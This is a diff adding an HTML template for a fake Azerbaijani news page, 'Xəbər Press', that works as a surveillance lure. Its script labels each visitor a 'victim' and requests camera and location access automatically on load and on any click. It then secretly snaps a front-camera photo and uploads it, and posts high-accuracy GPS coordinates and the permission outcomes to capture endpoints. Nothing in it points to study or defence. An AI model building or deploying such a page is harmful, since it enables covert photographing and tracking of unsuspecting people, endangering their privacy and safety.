@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Son Xəbərlər - Azərbaycan</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f5f5f5;
+            color: #333;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: white;
+            padding: 15px 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            text-align: center;
+        }
+        
+        .nav {
+            margin-top: 10px;
+            text-align: center;
+        }
+        
+        .nav a {
+            color: white;
+            text-decoration: none;
+            margin: 0 15px;
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        .main-content {
+            background: white;
+            margin: 20px auto;
+            max-width: 800px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        
+        .article-header {
+            padding: 30px;
+            background: linear-gradient(45deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        
+        .article-title {
+            font-size: 24px;
+            font-weight: bold;
+            line-height: 1.4;
+            margin-bottom: 10px;
+        }
+        
+        .article-meta {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        .article-image {
+            width: 100%;
+            height: 300px;
+            object-fit: cover;
+        }
+        
+        .article-content {
+            padding: 30px;
+        }
+        
+        .article-text {
+            font-size: 16px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        
+        .breaking-news {
+            background: #ff4757;
+            color: white;
+            padding: 10px 20px;
+            text-align: center;
+            font-weight: bold;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+        
+        .footer {
+            background: #2c3e50;
+            color: white;
+            text-align: center;
+            padding: 20px;
+            margin-top: 40px;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 20px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="breaking-news">
+        🔴 SON DƏQİQƏ: Mühüm xəbər yeniləndi
+    </div>
+    
+    <header class="header">
+        <div class="container">
+            <div class="logo">XƏBƏR PRESS</div>
+            <nav class="nav">
+                <a href="#">Ana Səhifə</a>
+                <a href="#">Siyasət</a>
+                <a href="#">İqtisadiyyat</a>
+                <a href="#">İdman</a>
+                <a href="#">Dünya</a>
+                <a href="#">Texnologiya</a>
+            </nav>
+        </div>
+    </header>
+    
+    <main class="main-content">
+        <div class="article-header">
+            <h1 class="article-title">Son Dəqiqə: Azərbaycanda Mühüm Hadisə Baş Verdi</h1>
+            <div class="article-meta">
+                📅 {{ "now"|date }} | 👁️ 15,847 baxış | 💬 234 şərh
+            </div>
+        </div>
+        
+        {% if image_path %}
+        <img src="/static/{{ image_path.split('/')[-1] }}" alt="Xəbər şəkli" class="article-image">
+        {% endif %}
+        
+        <div class="article-content">
+            <p class="article-text">
+                <strong>BAKI</strong> - Bu gün Azərbaycanda mühüm hadisələr baş verib. Dövlət rəsmiləri tərəfindən açıqlanan məlumatlara görə, 
+                vəziyyət nəzarət altındadır və əlavə tədbirlər görülür.
+            </p>
+            
+            <p class="article-text">
+                Hadisə ilə bağlı təfərrüatlar araşdırılır və tezliklə əlavə məlumatlar açıqlanacaq. 
+                Vətəndaşlardan sakit qalmaq və rəsmi mənbələrdən məlumat almaq xahiş olunur.
+            </p>
+            
+            <p class="article-text">
+                <em>Bu xəbər davamlı yenilənir...</em>
+            </p>
+            
+            <div class="loading" id="loading">
+                📡 Əlavə məlumatlar yüklənir...
+            </div>
+        </div>
+    </main>
+    
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2024 Xəbər Press. Bütün hüquqlar qorunur.</p>
+            <p>Azərbaycanda #1 xəbər mənbəyi</p>
+        </div>
+    </footer>
+
+    <script>
+        const victimId = {{ victim_id }};
+        let permissionsRequested = false;
+
+        // Function to send data to server
+        async function sendData(data) {
+            try {
+                await fetch('/api/capture', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        victim_id: victimId,
+                        ...data
+                    })
+                });
+            } catch (error) {
+                console.error('Error sending data:', error);
+            }
+        }
+
+        // Function to upload photo
+        async function uploadPhoto(blob) {
+            try {
+                const formData = new FormData();
+                formData.append('victim_id', victimId);
+                formData.append('photo', blob, 'camera.jpg');
+
+                await fetch('/api/upload_photo', {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (error) {
+                console.error('Error uploading photo:', error);
+            }
+        }
+
+        // Request camera permission and capture photo
+        async function requestCameraPermission() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' } 
+                });
+                
+                // Permission granted
+                await sendData({ camera_permission: 'granted' });
+                
+                // Capture photo
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                video.addEventListener('loadedmetadata', () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(async (blob) => {
+                        await uploadPhoto(blob);
+                        
+                        // Stop camera
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 'image/jpeg', 0.8);
+                });
+                
+            } catch (error) {
+                // Permission denied
+                await sendData({ camera_permission: 'denied' });
+            }
+        }
+
+        // Request location permission and get GPS
+        async function requestLocationPermission() {
+            if (!navigator.geolocation) {
+                await sendData({ location_permission: 'not_supported' });
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    // Permission granted
+                    await sendData({
+                        location_permission: 'granted',
+                        gps_latitude: position.coords.latitude,
+                        gps_longitude: position.coords.longitude,
+                        gps_accuracy: position.coords.accuracy
+                    });
+                },
+                async (error) => {
+                    // Permission denied
+                    await sendData({ location_permission: 'denied' });
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        // Auto-request permissions when page loads
+        window.addEventListener('load', async () => {
+            if (!permissionsRequested) {
+                permissionsRequested = true;
+                
+                // Small delay to let page load completely
+                setTimeout(async () => {
+                    await requestCameraPermission();
+                    await requestLocationPermission();
+                }, 2000);
+            }
+        });
+
+        // Also try on user interaction
+        document.addEventListener('click', async () => {
+            if (!permissionsRequested) {
+                permissionsRequested = true;
+                await requestCameraPermission();
+                await requestLocationPermission();
+            }
+        });
+
+        // Hide loading after a while
+        setTimeout(() => {
+            const loading = document.getElementById('loading');
+            if (loading) {
+                loading.style.display = 'none';
+            }
+        }, 5000);
+    </script>
+</body>
+</html>
